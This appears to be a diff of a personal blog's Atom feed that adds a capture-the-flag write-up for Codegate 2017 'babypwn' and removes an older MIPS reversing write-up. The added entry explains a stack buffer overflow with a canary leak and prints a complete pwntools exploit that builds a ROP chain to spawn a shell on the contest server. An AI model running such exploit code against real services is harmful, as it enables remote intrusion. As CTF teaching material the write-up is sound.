@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://poning.me/"/>
-  <updated>2016-12-06T02:44:18.000Z</updated>
+  <updated>2017-02-14T06:56:04.000Z</updated>
   <id>http://poning.me/</id>
   
   <author>
@@ -14,6 +14,51 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Codegate prequals 2017: babypwn (pwn 50)</title>
+    <link href="http://poning.me/2017/02/14/babypwn/"/>
+    <id>http://poning.me/2017/02/14/babypwn/</id>
+    <published>2017-02-14T06:56:04.000Z</published>
+    <updated>2017-02-14T06:56:04.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
+<p>BabyPwn~~~<br><a href="/2017/02/14/babypwn/babypwn" title="http://ctf.codegate.org/z/babypwn">http://ctf.codegate.org/z/babypwn</a><br>nc 110.10.212.130 8888<br>nc 110.10.212.130 8889</p>
+</blockquote>
+<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
+<li>Leak the canary</li>
+<li>Use ROP to leak the address of <code>libc</code> functions</li>
+<li>Find the <code>libc</code> version by <a href="libcdb.com">libcdb.com</a></li>
+<li>Use ROP to <code>dup2 dup2 system</code></li>
+</ul>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p><code>babypwn</code> is a TCP server. If we connect to it, it is basically a echo server.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre>▒▒▒▒▒▒▒C▒O▒D▒E▒G▒A▒T▒E▒2▒0▒1▒7▒▒▒▒▒▒▒<br>▒▒▒▒▒▒▒B▒A▒B▒Y▒P▒W▒N▒!▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒<br>▒▒▒▒▒▒▒G▒O▒O▒D▒L▒U▒C▒K▒~▒!▒▒▒▒▒▒▒▒▒▒▒<br>===============================<br>1. Echo<br>2. Reverse Echo<br>3. Exit<br>===============================<br>Select menu &gt; 1<br>Input Your Message : 123<br>123<br><br>===============================<br>1. Echo<br>2. Reverse Echo<br>3. Exit<br>===============================<br>Select menu &gt; 2<br>Input Your Message : 123<br><br>321<br>===============================<br>1. Echo<br>2. Reverse Echo<br>3. Exit<br>===============================<br>Select menu &gt;<br></pre></td></tr></table></figure>
+<p>The bug is a simple buffer overflow. At line 10 of the following code snippet, it reads 0x64 bytes to a buffer of 0x28 bytes.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br></pre></td><td class="code"><pre>send_str(<span class="hljs-string">"\n===============================\n"</span>);<br>send_str(<span class="hljs-string">"1. Echo\n"</span>);<br>send_str(<span class="hljs-string">"2. Reverse Echo\n"</span>);<br>send_str(<span class="hljs-string">"3. Exit\n"</span>);<br>send_str(<span class="hljs-string">"===============================\n"</span>);<br>v1 = get_num();<br><span class="hljs-keyword">if</span> ( v1 != <span class="hljs-number">1</span> )<br>  <span class="hljs-keyword">break</span>;<br>send_str(<span class="hljs-string">"Input Your Message : "</span>);<br>recv_str(&amp;v2, <span class="hljs-number">0x64</span>u);  <span class="hljs-comment">// BUG</span><br>send_str(&amp;v2);<br></pre></td></tr></table></figure>
+<p>Although the return address is protected by a canary, this program doesn’t append a null byte when receiving data and later return all the data before a null byte. Therefore, we can concatenate our input with the canary and leak it in the response of server. With the knowledge of canary, it is trivial to override the return address and launch a ROP attack.</p>
+<p>I want to make use of the <code>system</code> to spawn a shell, so my next step is to leak the address of the <code>libc</code>. Using ROP chain such as <code>send, padding, GOT of atoi</code>, I can leak the address of several <code>libc</code> functions. Finally, I need to know the <code>libc</code> version of the remote to calculate the correct offset of <code>system</code>. At first, I used <a href="https://github.com/niklasb/libc-database" target="_blank" rel="external">libc-database</a> but couldn’t find the matched version. Then, I try <a href="libcdb.com">libcdb.com</a> and luckily found the target <code><a href="/2017/02/14/babypwn/libc-2.19_16.so" title="libc">libc</a></code>. Now, I can use the standard <code>dup2 dup2 system</code> ROP chain to launch a shell and get the flag.</p>
+<p>The whole exploit is as follows. (Note that since it is a fork server, the canary and the <code>libc</code> base won’t change unless the server is relaunched. Therefore, I hardcoded the canary and <code>libc</code> functions in the script.)</p>
+<figure class="highlight python"><figcaption><span>babypwn_exp.py</span><a href="/2017/02/14/babypwn/babypwn_exp.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br>3<br>4<br>5<br>6<br>7<br>8<br>9<br>10<br>11<br>12<br>13<br>14<br>15<br>16<br>17<br>18<br>19<br>20<br>21<br>22<br>23<br>24<br>25<br>26<br>27<br>28<br>29<br>30<br>31<br>32<br>33<br>34<br>35<br>36<br>37<br>38<br>39<br>40<br>41<br>42<br>43<br>44<br>45<br>46<br>47<br></pre></td><td class="code"><pre><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><br>send_str = <span class="hljs-number">0x80488B1</span><br>print_goodbye = <span class="hljs-number">0x8048C23</span><br>got_atoi = <span class="hljs-number">0x804B050</span><br>pop_pop_ret = <span class="hljs-number">0x08048b84</span><br><br><span class="hljs-comment">## local</span><br><span class="hljs-comment"># canary = '\x00\xfa\xe4$'</span><br><span class="hljs-comment"># libc_base = 0xf7533000</span><br><span class="hljs-comment"># system = 0xf756e020</span><br><span class="hljs-comment"># dup2 = 0xf760b8f0</span><br><span class="hljs-comment"># bin_sh = 0xf769260f</span><br><br><span class="hljs-comment"># remote</span><br>canary = <span class="hljs-string">'\x00"\x8d3'</span><br>libc_base = <span class="hljs-number">0xf756f000</span><br>system = <span class="hljs-number">0xf75af190</span><br>bin_sh = <span class="hljs-number">0xf76cfa24</span><br>dup2 = <span class="hljs-number">0xf764a590</span><br><br>r = remote(<span class="hljs-string">'110.10.212.130'</span>, <span class="hljs-number">8888</span>)<br><span class="hljs-comment"># r = remote('127.0.0.1', 8181)</span><br><br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">'&gt; '</span>)<br>r.sendline(<span class="hljs-string">'1'</span>)<br><span class="hljs-keyword">print</span> r.recvuntil(<span class="hljs-string">': '</span>)<br>r.send(flat(<span class="hljs-string">'A'</span>*<span class="hljs-number">40</span>, canary, <span class="hljs-string">'A'</span>*<span class="hljs-number">12</span>,   <span class="hljs-comment"># padding</span><br>            dup2, pop_pop_ret, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>,  <span class="hljs-comment"># dup2(4, 0)</span><br>            dup2, pop_pop_ret, <span class="hljs-number">4</span>, <span class="hljs-number">1</span>,  <span class="hljs-comment"># dup2(4, 1)</span><br>            system, <span class="hljs-number">0</span>, bin_sh))       <span class="hljs-comment"># system("/bin/sh")</span><br><br><span class="hljs-keyword">print</span> repr(r.recvuntil(<span class="hljs-string">'&gt; '</span>))<br>r.sendline(<span class="hljs-string">'3'</span>)<br><br>r.interactive()<br><br><span class="hljs-comment">## leak the address of libc</span><br><span class="hljs-comment"># r.send(flat('A'*40, canary, 'A'*12, send_str, print_goodbye, got_atoi))</span><br><span class="hljs-comment"># print repr(r.recvuntil('&gt; '))</span><br><span class="hljs-comment"># r.sendline('3')</span><br><span class="hljs-comment"># data = r.recvall()</span><br><span class="hljs-comment"># print repr(data)</span><br><span class="hljs-comment"># print 'atoi: ' + hex(u32(data[:4]))</span><br><span class="hljs-comment"># print 'socket: ' + hex(u32(data[4:8]))</span><br><span class="hljs-comment"># print 'sigaction: ' + hex(u32(data[8:12]))</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Flag: <code>FLAG{Good_Job~!Y0u_@re_Very__G@@d!!!!!!^.^}</code></p>
+</blockquote>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;BabyPwn~~~&lt;br&gt;&lt;a href
+    
+    </summary>
+    
+      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
+    
+    
+      <category term="pwn" scheme="http://poning.me/tags/pwn/"/>
+    
+      <category term="Codegate prequals" scheme="http://poning.me/tags/Codegate-prequals/"/>
+    
+  </entry>
   
   <entry>
     <title>DefCamp CTF Finals 2016: SMS (pwn 200)</title>
@@ -65,7 +110,7 @@
     <link href="http://poning.me/2016/10/29/secret-holder/"/>
     <id>http://poning.me/2016/10/29/secret-holder/</id>
     <published>2016-10-29T12:46:05.000Z</published>
-    <updated>2016-12-06T02:44:30.000Z</updated>
+    <updated>2017-02-14T06:52:08.000Z</updated>
     
     <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
 <p>Break the Secret Holder and find the secret.<br>nc 52.68.31.117 5566<br><a href="/2016/10/29/secret-holder/SecretHolder_d6c0bed6d695edc12a9e7733bedde182554442f8" title="SecretHolder">SecretHolder</a></p>
@@ -137,7 +182,7 @@
     <link href="http://poning.me/2016/10/04/my-gift/"/>
     <id>http://poning.me/2016/10/04/my-gift/</id>
     <published>2016-10-04T11:08:36.000Z</published>
-    <updated>2016-10-04T11:08:36.000Z</updated>
+    <updated>2017-02-14T02:45:27.000Z</updated>
     
     <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
 <p>10.13.37.22:1337<br><a href="/2016/10/04/my-gift/exp200.bin" title="https://dctf.def.camp/quals-2016/exp200.bin">https://dctf.def.camp/quals-2016/exp200.bin</a></p>
@@ -163,7 +208,7 @@
     
       <category term="x86-64" scheme="http://poning.me/tags/x86-64/"/>
     
-      <category term="D-CTF Quals 2016" scheme="http://poning.me/tags/D-CTF-Quals-2016/"/>
+      <category term="D-CTF Quals" scheme="http://poning.me/tags/D-CTF-Quals/"/>
     
       <category term="stack overflow" scheme="http://poning.me/tags/stack-overflow/"/>
     
@@ -174,7 +219,7 @@
     <link href="http://poning.me/2016/10/04/warm-heap/"/>
     <id>http://poning.me/2016/10/04/warm-heap/</id>
     <published>2016-10-04T08:46:04.000Z</published>
-    <updated>2016-10-28T17:09:18.000Z</updated>
+    <updated>2017-02-14T02:45:32.000Z</updated>
     
     <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
 <p>10.13.37.21:1337<br><a href="/2016/10/04/warm-heap/exp100.bin" title="https://dctf.def.camp/quals-2016/exp100.bin">https://dctf.def.camp/quals-2016/exp100.bin</a></p>
@@ -201,7 +246,7 @@
     
       <category term="x86-64" scheme="http://poning.me/tags/x86-64/"/>
     
-      <category term="D-CTF Quals 2016" scheme="http://poning.me/tags/D-CTF-Quals-2016/"/>
+      <category term="D-CTF Quals" scheme="http://poning.me/tags/D-CTF-Quals/"/>
     
       <category term="GOT" scheme="http://poning.me/tags/GOT/"/>
     
@@ -814,43 +859,6 @@
       <category term="reversing" scheme="http://poning.me/tags/reversing/"/>
     
       <category term="x86-64" scheme="http://poning.me/tags/x86-64/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Internetwache CTF 2016: SPIM (rev 50)</title>
-    <link href="http://poning.me/2016/02/25/spim/"/>
-    <id>http://poning.me/2016/02/25/spim/</id>
-    <published>2016-02-25T13:20:00.000Z</published>
-    <updated>2016-08-04T02:56:07.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
-<p>My friend keeps telling me, that real hackers speak assembly fluently. Are you a real hacker? Decode this string: “IVyN5U3X)ZUMYCs”<br><strong>Attachment:</strong> <a href="/2016/02/25/spim/rev50.zip" title="rev50.zip">rev50.zip</a></p>
-</blockquote>
-<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><figure class="highlight mips"><figcaption><span>README.txt</span></figcaption><table><tr><td class="code"><pre>User Text Segment [<span class="hljs-number">00400000</span>]..[<span class="hljs-number">00440000</span>]<br>[<span class="hljs-number">00400000</span>] <span class="hljs-number">8</span>fa40000  <span class="hljs-keyword">lw </span>$<span class="hljs-number">4</span>, <span class="hljs-number">0</span>($<span class="hljs-number">29</span>)            <span class="hljs-comment">; 183: lw $a0 0($sp) # argc </span><br>[<span class="hljs-number">00400004</span>] <span class="hljs-number">27</span>a50004  <span class="hljs-keyword">addiu </span>$<span class="hljs-number">5</span>, $<span class="hljs-number">29</span>, <span class="hljs-number">4</span>         <span class="hljs-comment">; 184: addiu $a1 $sp 4 # argv </span><br>[<span class="hljs-number">00400008</span>] <span class="hljs-number">24</span>a60004  <span class="hljs-keyword">addiu </span>$<span class="hljs-number">6</span>, $<span class="hljs-number">5</span>, <span class="hljs-number">4</span>          <span class="hljs-comment">; 185: addiu $a2 $a1 4 # envp </span><br>[<span class="hljs-number">0040000</span>c] <span class="hljs-number">00041080</span>  <span class="hljs-keyword">sll </span>$<span class="hljs-number">2</span>, $<span class="hljs-number">4</span>, <span class="hljs-number">2</span>            <span class="hljs-comment">; 186: sll $v0 $a0 2 </span><br>[<span class="hljs-number">00400010</span>] <span class="hljs-number">00</span>c23021  <span class="hljs-keyword">addu </span>$<span class="hljs-number">6</span>, $<span class="hljs-number">6</span>, $<span class="hljs-number">2</span>          <span class="hljs-comment">; 187: addu $a2 $a2 $v0 </span><br>[<span class="hljs-number">00400014</span>] <span class="hljs-number">0</span>c100009  <span class="hljs-keyword">jal </span><span class="hljs-number">0x00400024</span> [main]    <span class="hljs-comment">; 188: jal main </span><br>[<span class="hljs-number">00400018</span>] <span class="hljs-number">00000000</span>  <span class="hljs-keyword">nop </span>                     <span class="hljs-comment">; 189: nop </span><br>[<span class="hljs-number">0040001</span>c] <span class="hljs-number">3402000</span>a  <span class="hljs-keyword">ori </span>$<span class="hljs-number">2</span>, $<span class="hljs-number">0</span>, <span class="hljs-number">10</span>           <span class="hljs-comment">; 191: li $v0 10 </span><br>[<span class="hljs-number">00400020</span>] <span class="hljs-number">0000000</span>c  <span class="hljs-keyword">syscall </span>                 <span class="hljs-comment">; 192: syscall # syscall 10 (exit) </span><br>[<span class="hljs-number">00400024</span>] <span class="hljs-number">3</span>c081001  <span class="hljs-keyword">lui </span>$<span class="hljs-number">8</span>, <span class="hljs-number">4097</span> [flag]      <span class="hljs-comment">; 7: la $t0, flag </span><br>[<span class="hljs-number">00400028</span>] <span class="hljs-number">00004821</span>  <span class="hljs-keyword">addu </span>$<span class="hljs-number">9</span>, $<span class="hljs-number">0</span>, $<span class="hljs-number">0</span>          <span class="hljs-comment">; 8: move $t1, $0 </span><br>[<span class="hljs-number">0040002</span>c] <span class="hljs-number">3401000</span>f  <span class="hljs-keyword">ori </span>$<span class="hljs-number">1</span>, $<span class="hljs-number">0</span>, <span class="hljs-number">15</span>           <span class="hljs-comment">; 11: sgt $t2, $t1, 15 </span><br>[<span class="hljs-number">00400030</span>] <span class="hljs-number">0029502</span>a  <span class="hljs-keyword">slt </span>$<span class="hljs-number">10</span>, $<span class="hljs-number">1</span>, $<span class="hljs-number">9</span>          <br>[<span class="hljs-number">00400034</span>] <span class="hljs-number">34010001</span>  <span class="hljs-keyword">ori </span>$<span class="hljs-number">1</span>, $<span class="hljs-number">0</span>, <span class="hljs-number">1</span>            <span class="hljs-comment">; 12: beq $t2, 1, exit </span><br>[<span class="hljs-number">00400038</span>] <span class="hljs-number">102</span>a0007  <span class="hljs-keyword">beq </span>$<span class="hljs-number">1</span>, $<span class="hljs-number">10</span>, <span class="hljs-number">28</span> [exit-0x00400038] <br>[<span class="hljs-number">0040003</span>c] <span class="hljs-number">01095020</span>  <span class="hljs-keyword">add </span>$<span class="hljs-number">10</span>, $<span class="hljs-number">8</span>, $<span class="hljs-number">9</span>          <span class="hljs-comment">; 14: add $t2, $t0, $t1 </span><br>[<span class="hljs-number">00400040</span>] <span class="hljs-number">81440000</span>  <span class="hljs-keyword">lb </span>$<span class="hljs-number">4</span>, <span class="hljs-number">0</span>($<span class="hljs-number">10</span>)            <span class="hljs-comment">; 15: lb $a0, ($t2) </span><br>[<span class="hljs-number">00400044</span>] <span class="hljs-number">00892026</span>  <span class="hljs-keyword">xor </span>$<span class="hljs-number">4</span>, $<span class="hljs-number">4</span>, $<span class="hljs-number">9</span>           <span class="hljs-comment">; 16: xor $a0, $a0, $t1 </span><br>[<span class="hljs-number">00400048</span>] a1440000  <span class="hljs-keyword">sb </span>$<span class="hljs-number">4</span>, <span class="hljs-number">0</span>($<span class="hljs-number">10</span>)            <span class="hljs-comment">; 17: sb $a0, 0($t2) </span><br>[<span class="hljs-number">0040004</span>c] <span class="hljs-number">21290001</span>  <span class="hljs-keyword">addi </span>$<span class="hljs-number">9</span>, $<span class="hljs-number">9</span>, <span class="hljs-number">1</span>           <span class="hljs-comment">; 19: add $t1, $t1, 1 </span><br>[<span class="hljs-number">00400050</span>] <span class="hljs-number">0810000</span>b  <span class="hljs-keyword">j </span><span class="hljs-number">0x0040002c</span> [for]       <span class="hljs-comment">; 20: j for </span><br>[<span class="hljs-number">00400054</span>] <span class="hljs-number">00082021</span>  <span class="hljs-keyword">addu </span>$<span class="hljs-number">4</span>, $<span class="hljs-number">0</span>, $<span class="hljs-number">8</span>          <span class="hljs-comment">; 24: move $a0, $t0 </span><br>[<span class="hljs-number">00400058</span>] <span class="hljs-number">0</span>c100019  <span class="hljs-keyword">jal </span><span class="hljs-number">0x00400064</span> [printstring]<span class="hljs-comment">; 25: jal printstring </span><br>[<span class="hljs-number">0040005</span>c] <span class="hljs-number">3402000</span>a  <span class="hljs-keyword">ori </span>$<span class="hljs-number">2</span>, $<span class="hljs-number">0</span>, <span class="hljs-number">10</span>           <span class="hljs-comment">; 26: li $v0, 10 </span><br>[<span class="hljs-number">00400060</span>] <span class="hljs-number">0000000</span>c  <span class="hljs-keyword">syscall </span>                 <span class="hljs-comment">; 27: syscall </span><br>[<span class="hljs-number">00400064</span>] <span class="hljs-number">34020004</span>  <span class="hljs-keyword">ori </span>$<span class="hljs-number">2</span>, $<span class="hljs-number">0</span>, <span class="hljs-number">4</span>            <span class="hljs-comment">; 30: li $v0, 4 </span><br>[<span class="hljs-number">00400068</span>] <span class="hljs-number">0000000</span>c  <span class="hljs-keyword">syscall </span>                 <span class="hljs-comment">; 31: syscall </span><br>[<span class="hljs-number">0040006</span>c] <span class="hljs-number">03</span>e00008  <span class="hljs-keyword">jr </span>$<span class="hljs-number">31</span>                   <span class="hljs-comment">; 32: jr $ra </span><br></pre></td></tr></table></figure>
-<p>As the title suggests, this is a MIPS assembly file (SPIM is a MIPS simulator). The key instruction is <code>xor $a0, $a0, $t1</code>. This program uses a loop to xor every charactor with the counter. We can decode it as follw.</p>
-<figure class="highlight python"><figcaption><span>decode.py</span><a href="/2016/02/25/spim/decode.py">download</a></figcaption><table><tr><td class="gutter"><pre>1<br>2<br></pre></td><td class="code"><pre>enc = <span class="hljs-string">'IVyN5U3X)ZUMYCs'</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">''</span>.join([chr(ord(c)^i) <span class="hljs-keyword">for</span> i, c <span class="hljs-keyword">in</span> enumerate(enc)])<br></pre></td></tr></table></figure>
-<p>To solve this question, you either learn the basic of MIPS, or you can try xoring the first three charactors of encoded string <code>IVy</code> with the known beginning of th flag <code>IW{</code>. You will find out that the output is <code>0 1 2</code> and can guess the whole algorithm.</p>
-<blockquote>
-<p>Flag: <code>IW{M1P5_!S_FUN}</code></p>
-</blockquote>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Description&quot;&gt;&lt;/a&gt;Description&lt;/h2&gt;&lt;blockquote&gt;
-&lt;p&gt;My friend keeps telli
-    
-    </summary>
-    
-      <category term="writeup" scheme="http://poning.me/categories/writeup/"/>
-    
-    
-      <category term="Internetwache CTF" scheme="http://poning.me/tags/Internetwache-CTF/"/>
-    
-      <category term="reversing" scheme="http://poning.me/tags/reversing/"/>
-    
-      <category term="MIPS" scheme="http://poning.me/tags/MIPS/"/>
     
   </entry>
   
